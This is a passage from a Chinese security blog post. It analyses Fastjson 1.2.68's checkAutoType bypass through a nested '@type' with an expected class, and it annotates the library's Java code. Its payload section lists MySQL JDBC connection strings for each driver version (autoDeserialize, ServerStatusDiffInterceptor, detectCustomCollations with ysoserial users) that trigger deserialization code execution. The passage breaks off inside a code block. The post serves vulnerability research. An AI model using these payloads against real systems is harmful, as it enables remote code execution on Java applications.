class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空 不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//默认不进入</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//expectClass为期望类，</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expectClass != Object.class &amp;&amp; expectClass != Serializable.class &amp;&amp; expectClass != Cloneable.class &amp;&amp; expectClass != Closeable.class &amp;&amp; expectClass != EventListener.class &amp;&amp; expectClass != Iterable.class &amp;&amp; expectClass != Collection.class) &#123;<span class="hljs-comment">//判断期望类是否为以上类</span><br>                expectClassFlag = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">//!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><span class="hljs-comment">//从map中获取类</span><br>                clazz = TypeUtils.getClassFromMapping(typeName);<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br><span class="hljs-comment">//若在内部白名单中则加载类</span><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">//判断clazz不为HashMap且不为expectClass继承类，则返回类</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<span class="hljs-comment">//autoTypeSupport为false进入</span><br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-comment">//若在黑名单中报错</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br><span class="hljs-comment">//若在白名单中且为期望类则返回类</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-comment">//判断使用注解JSONType的类</span><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var28) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;<br>                    <span class="hljs-comment">//若autoTypeSupport(开启autoType)  jsonType(使用JSONType注解)   expectClassFlag(有期望类且期望类符合条件)   其中有一个为true则进入</span><br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<span class="hljs-comment">//cacheClass 此处为false</span><br>                        <span class="hljs-comment">//classLoader不开启缓存加载类</span><br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//clazz 不为空进入</span><br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<span class="hljs-comment">//若jsonType为true则在map中添加类，后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-comment">//若类为ClassLoader、DataSource、RowSet子类则抛出异常</span><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-comment">//若期望类不为空且目标类为期望类子类则在map中添加类后返回类</span><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<span class="hljs-comment">//autoTypeSupport为false抛出异常</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//autoTypeSupport为true则在map中添加类后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当第一次进行checkAutoType()校验，传入expectClass为空，通过查找发现以下位置调用checkAutoType()</p><p><img src="/image/image-20220914163303120-16631443851911.png" alt="image-20220914163303120"></p><p>其中JavaBeanDeserializer#deserialze()和ThrowableDeserializer#deserialze()中调用的checkAutoType()均传入expectClass。JavaBeanDeserializer为默认反序列化器，ThrowableDeserializer为针对异常类的反序列化器</p><h6 id="2-JavaBeanDeserializer"><a href="#2-JavaBeanDeserializer" class="headerlink" title="2.JavaBeanDeserializer"></a>2.JavaBeanDeserializer</h6><p>第一次通过checkAutoType()检测后运行至</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializer(clazz);<br></code></pre></td></tr></table></figure><p>调用至ParserConfig#getDeserializer()，根据typeName获取对应反序列化器</p><p><img src="/image/image-20220915101030775-16632078323731.png" alt="image-20220915101030775"></p><p>最后调用至return new JavaBeanDeserializer(this, clazz, type);创建JavaBeanDeserializer 对象</p><p><img src="/image/image-20220915102116512-16632084784343.png" alt="image-20220915102116512"></p><p>获取反序列化器后运行相应反序列化器deserialze(this, clazz, fieldName)方法，deserializer为不同的反序列化器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> deserializer.deserialze(<span class="hljs-built_in">this</span>, clazz, fieldName);<br></code></pre></td></tr></table></figure><p>当调用JavaBeanDeserializer#deserialze(),type为clazz类全名</p><p><img src="/image/image-20220914173452845-16631480945763.png" alt="image-20220914173452845"></p><p>获取第二个@type值为typeName</p><p><img src="/image/image-20220914174838376-16631489201257.png" alt="image-20220914174838376"></p><p>将JSON串中第一个@type值为expectClass，第二个@type值为typeName进程checkAutoType()校验，若符合上述条件则可通过校验</p><p><img src="/image/image-20220914173711736-16631482335105.png" alt="image-20220914173711736"></p><p>通过校验后再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p><p><img src="/image/image-20220915113231225-16632127531165.png" alt="image-20220915113231225"></p><h6 id="3-ThrowableDeserializer"><a href="#3-ThrowableDeserializer" class="headerlink" title="3.ThrowableDeserializer"></a>3.ThrowableDeserializer</h6><p>与之前调用链相同，到达ThrowableDeserializer#deserialze() 前，对第一个@type指定的类进行了ParserConfig#checkAutoType()校验。若通过校验则进入到ThrowableDeserializer#deserialze()，词法分析器将继续遍历JSON字符串剩余的部分，如果下一个仍为@type，则将第二个@type值作为将校验类名称typeNmae，Throwable.class作为期望类expectClass，一同传入ParserConfig#checkAutoType()进行校验</p><p><img src="/image/image-20220915145950238-16632251916707.png" alt="image-20220915145950238"></p><p>通过校验后将再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p><p><img src="/image/image-20220915150716972-16632256384399.png" alt="image-20220915150716972"></p><p>故若需通过ThrowableDeserializer反序列化目标类，通过两次checkAutoType()校验，则需：</p><ol><li>第一个@type类为Throwable子类且在TypeUtils#mappings中</li><li>第二个@type类为Throwable子类</li></ol><p>因Throwable不在TypeUtils#mappings中，故可使用Throwable子类java.lang.Exception</p><h5 id="PAYLOAD-9"><a href="#PAYLOAD-9" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><h6 id="Gadget-1-命令执行"><a href="#Gadget-1-命令执行" class="headerlink" title="Gadget 1:命令执行"></a>Gadget 1:命令执行</h6><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x.xx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>MySQL JDBC 反序列化链：</p><p>ServerStatusDiffInterceptor链</p><ul><li>5.1.0-5.1.10：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  连接后需执行查询</li><li>5.1.11-5.x.xx：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  （包名中添加cj）</li><li>8.0.20以下：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li></ul><p>detectCustomCollations链</p><ul><li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.40：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.41 以上 不可用</li></ul><p>利用链简单分析：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">**queryInterceptors:**一个逗号分割的Class列表（实现了com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.interceptors</span>.QueryInterceptor接口的Class），在Query<span class="hljs-string">&quot;之间&quot;</span>进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）<br>**autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。<br></code></pre></td></tr></table></figure><p>detectCustomCollations链：</p><p>com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildCollationMapping</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>...<br>        <br>    <br>    <span class="hljs-keyword">if</span> (indexToCharset == <span class="hljs-literal">null</span>) &#123;<br>        indexToCharset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//判断服务版本大于4.1.0且detectCustomCollations为true则进入</span><br>        <span class="hljs-comment">//5.1.28此处判断条件只有服务版本大于4.1.0</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">this</span>.getDetectCustomCollations()) &#123;<br>            java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                sortedCollationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();<br>                customCharset = <span 